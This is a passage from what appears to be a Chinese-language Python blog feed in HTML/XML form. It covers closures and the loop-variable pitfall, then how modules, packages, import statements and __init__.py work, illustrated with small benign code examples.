triple-quoted-string string">'''在这个例子中，我们在函数lazy_sum中又定义了函数sum，并且，内部函数sum可以引用外部函数lazy_sum的参数和局部变量，当lazy_sum返回函数sum时，相关参数和变量都保存在返回的函数中，这种称为“闭包（Closure）”的程序结构拥有极大的威力。请再注意一点，当我们调用lazy_sum()时，每次调用都会返回一个新的函数，即使传入相同的参数：'''</span>f1 <span class="token operator">=</span> lazy_sum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span>f2 <span class="token operator">=</span> lazy_sum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span>f1<span class="token operator">==</span>f2OUTPUT<span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token string">'f1()和f2()的调用结果互不影响。'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="#00B2EE" face="Comic sans MS"><strong>三、闭包</strong></font></p><p>&emsp;&emsp;注意到返回的函数在其定义内部引用了局部变量<code>args</code>，所以，当一个函数返回了一个函数后，其内部的局部变量还被新函数引用，所以，闭包用起来简单，实现起来可不容易。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">'''另一个需要注意的问题是，返回的函数并没有立刻执行，而是直到调用了f()才执行。    我们来看一个例子：'''</span><span class="token keyword">def</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    fs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">return</span> i<span class="token operator">*</span>i        fs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">return</span> fsf1<span class="token punctuation">,</span> f2<span class="token punctuation">,</span> f3 <span class="token operator">=</span> count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''在上面的例子中，每次循环，都创建了一个新的函数，然后，把创建的3个函数都返回了。你可能认为调用f1()，f2()和f3()结果应该是1，4，9，但实际结果是：'''</span><span class="token operator">>></span><span class="token operator">></span> f1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">9</span><span class="token operator">>></span><span class="token operator">></span> f2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">9</span><span class="token operator">>></span><span class="token operator">></span> f3<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">9</span><span class="token triple-quoted-string string">'''全部都是9！原因就在于返回的函数引用了变量i，但它并非立刻执行。等到3个函数都返回时，它们所引用的变量i已经变成了3，因此最终结果为9。返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。如果一定要引用循环变量怎么办？方法是再创建一个函数，用该函数的参数绑定循环变量当前的值，无论该循环变量后续如何更改，已绑定到函数参数的值不变：'''</span><span class="token keyword">def</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> j<span class="token operator">*</span>j        <span class="token keyword">return</span> g    fs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        fs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>f<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># f(i)立刻被执行，因此i的当前值被传入f()</span>    <span class="token keyword">return</span> fs<span class="token string">'再看看结果：'</span><span class="token operator">>></span><span class="token operator">></span> f1<span class="token punctuation">,</span> f2<span class="token punctuation">,</span> f3 <span class="token operator">=</span> count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> f1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> f2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">4</span><span class="token operator">>></span><span class="token operator">></span> f3<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">9</span><span class="token triple-quoted-string string">'''缺点是代码较长，可利用lambda函数缩短代码。'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="二-装饰器"><font color="#FF6347" face="Comic sans MS">二. 装饰器</font><a href="post/Python-FunctionalProgramming#二-装饰器"></a></h3>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-模块和包</title>
      <link href="/post/Python-Modules-Packages/"/>
      <url>/post/Python-Modules-Packages/</url>
      
        <content type="html"><![CDATA[<p>from…import…😀</p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">模块和包</font> </center><br><br><h3 id="一-模块与包的意义"><font color="#FF6347" face="Comic sans MS">一. 模块与包的意义</font><a href="post/Python-Modules-Packages#一-模块与包的意义"></a></h3><br><h4 id="1-1-什么是模块？"><font color="#3CB371" face="Comic sans MS">1.1 什么是模块？</font><a href="post/Python-Modules-Packages#1-1-什么是模块？"></a></h4><blockquote><p><font color="#FF7F00" face="Microsoft YaHei"><strong>在Python中，一个.py文件就称之为一个模块（Module）。</strong></font></p></blockquote><br><h4 id="1-2-为什么要使用模块？"><font color="#3CB371" face="Comic sans MS">1.2 为什么要使用模块？</font><a href="post/Python-Modules-Packages#1-2-为什么要使用模块？"></a></h4><ul><li><font face="Microsoft YaHei">为了编写可维护的代码，我们把很多函数分组，分别放到不同的文件里，这样，每个文件包含的代码就相对较少，很多编程语言都采用这种组织代码的方式。</font></li></ul><ul><li><font face="Microsoft YaHei">随着程序的发展，功能越来越多，为了方便管理，我们通常将程序分成一个个的文件，这样做程序的结构更清晰，方便管理。这时我们不仅仅可以把这些文件当做脚本去执行，还可以把他们当做模块来导入到其他的模块中，实现了功能的重复利用。</font></li></ul><ul><li><font face="Microsoft YaHei">我们在编写程序的时候，也经常引用其他模块，包括Python内置的模块和来自第三方的模块。</font></li></ul><ul><li><font face="Microsoft YaHei">使用模块还可以避免函数名和变量名冲突。相同名字的函数和变量完全可以分别存在不同的模块中，因此，我们自己在编写模块时，不必考虑名字会与其他模块冲突。但是也要注意，尽量不要与内置函数名字冲突。</font></li></ul><br><h4 id="1-3-什么是包？"><font color="#3CB371" face="Comic sans MS">1.3 什么是包？</font><a href="post/Python-Modules-Packages#1-3-什么是包？"></a></h4><ol><li><font face="Microsoft YaHei">如果不同的人编写的模块名相同怎么办？为了避免模块名冲突，Python又引入了按目录（文件夹）来组织模块的方法，称为包（Package）。</font></li></ol><ol start="2"><li><font face="Microsoft YaHei">包是目录级的（文件夹级），文件夹是用来组成py文件（包的本质就是一个包含<code>__init__.py</code>文件的目录）</font></li></ol><ol start="3"><li><font face="Microsoft YaHei"><font color="#FF7F00"><strong>每一个包目录下面都会有一个 <code>__init__.py</code> 的文件，这个文件是必须存在的，否则，Python就把这个目录当成普通目录，而不是一个包</strong></font>。它可以是空文件，也可以有Python代码，因为 <code>__init__.py</code> 本身就是一个模块。</font></li></ol><ol start="4"><li><font face="Microsoft YaHei">import导入文件时，产生名称空间中的名字来源于文件，import 包，产生的名称空间的名字同样来源于文件，即包下的 <code>__init__.py</code> ，<font color="#FF7F00"><strong>导入包本质就是在导入该文件</strong></font>。</font></li></ol><ol start="5"><li><font face="Microsoft YaHei">文件夹里面还可以包含文件夹（可以有多级目录，组成多级层次的包结构）。但是每一个文件夹下面必须有一个 <code>__init__.py</code> 文件。</font></li></ol><ol start="6"><li><font face="Microsoft YaHei">自己创建模块时要注意命名，不能和Python自带的模块名称冲突。例如，系统自带了sys模块，自己的模块就不可命名为sys.py，否则将无法导入系统自带的sys模块。</font></li></ol><br><p><font face="Comic sans MS"><strong>举例说明：</strong></font></p><p>有个包按照如下目录存放文件：</p><p>mycompany<br>├─ __init__.py<br>├─ abc.py<br>└─ xyz.py</p><blockquote><p><font face="Microsoft YaHei">引入了包以后，只要顶层的包名不与别人冲突，那所有模块都不会与别人冲突。现在，<strong><code>abc.py</code></strong> 模块的名字就变成了 <strong><code>mycompany.abc</code></strong> ，类似的，<strong><code>xyz.py</code></strong> 的模块名变成了 <strong><code>mycompany.xyz</code></strong> 。</font></p></blockquote><br><p>类似的，可以有多级目录，组成多级层次的包结构。比如如下的目录结构：</p><p>mycompany<br> ├─ web<br> │  ├─ __init__.py<br> │  ├─ utils.py<br> │  └─ <a href="http://www.py" target="_blank" rel="noopener">www.py</a><br> ├─ __init__.py<br> ├─ abc.py<br> └─ xyz.py</p><blockquote><p><font face="Microsoft YaHei">文件<code>www.py</code> 的模块名就是<code>mycompany.web.www</code>，两个文件utils.py的模块名分别是<code>mycompany.utils</code>和 <code>mycompany.web.utils</code></font></p></blockquote><br><p><font color="#00B2EE" face="Comic sans MS"><strong>总结</strong><br></font></p><p><font face="Microsoft YaHei">模块是一组Python代码的集合，可以使用其他模块，也可以被其他模块使用。<br></font></p><blockquote><p><font color="#FF7F00" face="Microsoft YaHei"><strong>创建自己的模块时，要注意：</strong></font></p><ol><li><font face="Microsoft YaHei"> 模块名要遵循Python变量命名规范，不要使用中文、特殊字符；</font></li><li><font face="Microsoft YaHei">模块名不要和系统模块名冲突，最好先查看系统是否已存在该模块，检查方法是在Python交互环境执行import abc，若成功则说明系统存在此模块。</font></li></ol></blockquote><br><br><h3 id="二-使用模块-无包组织"><font color="#FF6347" face="Comic sans MS">二. 使用模块 -- 无包组织</font><a href="post/Python-Modules-Packages#二-使用模块-无包组织"></a></h3><br><blockquote><p><font color="#FF7F00"><strong>使用模块的几种语句：</strong></font></p><ol><li><font face="Microsoft YaHei"><strong>import 语句：</strong> <strong><code>import module1[, module2[,... moduleN]</code></strong></font></li><li><font face="Microsoft YaHei"><strong>from … import 语句：</strong> <strong><code>from  modname import  name1[, name2[, ... nameN]]</code></strong> </font></li><li><font face="Microsoft YaHei"><strong>from … import * 语句：</strong> <strong><code>from  modname import *</code></strong></font></li><li><font face="Microsoft YaHei"><strong>__name__属性：</strong> 用来分清该模块是调用者还是被其他模块调用。</font></li><li><font face="Microsoft YaHei"><strong>dir() 函数：</strong> 用来查找模块中定义的名字，返回一个有序字符串列表。</font></li></ol></blockquote><br><h4 id="2-1-import-语句"><font color="#3CB371" face="Comic sans MS">2.1 import 语句</font><a href="post/Python-Modules-Packages#2-1-import-语句"></a></h4><p><font face="Microsoft YaHei">想使用 Python 源文件，只需在另一个源文件里执行 import 语句，语法如下：</font></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> module1<span class="token punctuation">[</span><span class="token punctuation">,</span> module2<span class="token punctuation">[</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> moduleN<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p><font face="Microsoft YaHei">使用 Python 源文件，只需在另一个源文件里执行 import 语句。</font></p></li><li><p><font face="Microsoft YaHei">一个模块只会被导入一次，不管你执行了多少次import。这样可以防止导入模块被一遍又一遍地执行。</font></p></li><li><p><font face="Microsoft YaHei">调用者引用模块后可以：<code>模块名.函数名(参数)</code>来使用。</font></p></li></ol><br><p>举例说明：<br>当解释器遇到 import 语句，如果模块在当前的搜索路径就会被导入。如想要导入模块 support，需要把命令放在脚本的顶端：</p><pre class="line-numbers language-python"><code class="language-python">support<span class="token punctuation">.</span>py 文件代码<span class="token keyword">def</span> <span class="token function">print_func</span><span class="token punctuation">(</span> par <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Hello : "</span><span class="token punctuation">,</span> par<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>test<span class="token punctuation">.</span>py 文件代码<span class="token comment" spellcheck="true"># 导入模块</span><span class="token keyword">import</span> support<span class="token comment" spellcheck="true"># 现在可以调用模块里包含的函数了</span>support<span class="token punctuation">.</span>print_func<span class="token punctuation">(</span><span class="token string">"Runoob"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>运行test<span class="token punctuation">.</span>py实例输出结果：Hello <span class="token punctuation">:</span>  Runoob<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="2-2-from-…-import-语句"><font color="#3CB371" face="Comic sans MS">2.2 from … import 语句</font><a href="post/Python-Modules-Packages#2-2-from-…-import-语句"></a></h4><p><font face="Microsoft YaHei">Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中，<strong>这种访问函数时可以直接使用函数名而不需要前缀</strong>，语法如下：</font></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> modname <span class="token keyword">import</span> name1<span class="token punctuation">[</span><span class="token punctuation">,</span> name2<span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> nameN<span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><p>举例说明：<br>例如，要导入模块 fibo 的 fib 函数，使用如下语句：</p><pre class="line-numbers language-python"><code class="language-python">fibo<span class="token punctuation">.</span>py<span class="token comment" spellcheck="true"># 斐波那契(fibonacci)数列模块</span><span class="token keyword">def</span> <span class="token function">fib</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义到 n 的斐波那契数列</span>    a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>    <span class="token keyword">while</span> b <span class="token operator">&lt;</span> n<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a<span class="token operator">+</span>b    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token operator">//</span>输出为None<span class="token keyword">def</span> <span class="token function">fib2</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 返回到 n 的斐波那契数列</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>    <span class="token keyword">while</span> b <span class="token operator">&lt;</span> n<span class="token punctuation">:</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token punctuation">)</span>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a<span class="token operator">+</span>b    <span class="token keyword">return</span> result<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>test<span class="token punctuation">.</span>py<span class="token keyword">from</span> fibo <span class="token keyword">import</span> fib<span class="token punctuation">,</span> fib2<span class="token keyword">print</span><span class="token punctuation">(</span>fib<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fib2<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">)</span>运行结果：<span class="token number">1</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">5</span> <span class="token number">8</span> <span class="token number">13</span> <span class="token number">21</span> <span class="token number">34</span> <span class="token number">55</span> <span class="token number">89</span> <span class="token number">144</span> <span class="token number">233</span> <span class="token number">377</span>None<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">377</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="2-3-from-…-import-语句"><font color="#3CB371" face="Comic sans MS">2.3 from … import * 语句</font><a href="post/Python-Modules-Packages#2-3-from-…-import-语句"></a></h4><ul><li><p><font face="Microsoft YaHei">这提供了一个简单的方法来导入一个模块中的所有项目。然而这种声明不该被过多地使用。</font></p></li><li><p><font face="Microsoft YaHei">这种方法，可以一次性的把模块中的所有（函数，变量）名称都导入到当前模块的字符表。</font></p></li><li><p><font face="Microsoft YaHei">这将把所有的名字都导入进来，但是那些由单一下划线（_）开头的名字不在此例。大多数情况， Python程序员不使用这种方法，因为引入的其它来源的命名，很可能覆盖了已有的定义。</font></p></li></ul><br><p>把一个模块的所有内容全都导入到当前的命名空间也是可行的，只需使用如下声明：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> modname <span class="token keyword">import</span> <span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><br><h3 id="三-使用模块-有包组织"><font color="#FF6347" face="Comic sans MS">三. 使用模块 -- 有包组织</font><a href="post/Python-Modules-Packages#三-使用模块-有包组织"></a></h3><ul><li><p><font face="Microsoft YaHei">目录只有包含一个叫做 <code>__init__.py</code> 的文件才会被认作是一个包，主要是为了避免一些滥俗的名字（比如叫做 string）不小心的影响搜索路径中的有效模块。</font></p></li><li><p><font face="Microsoft YaHei">最简单的情况，放一个空的 <code>__init__.py</code>就可以了。当然这个文件中也可以包含一些初始化代码或者为（将在后面介绍的） 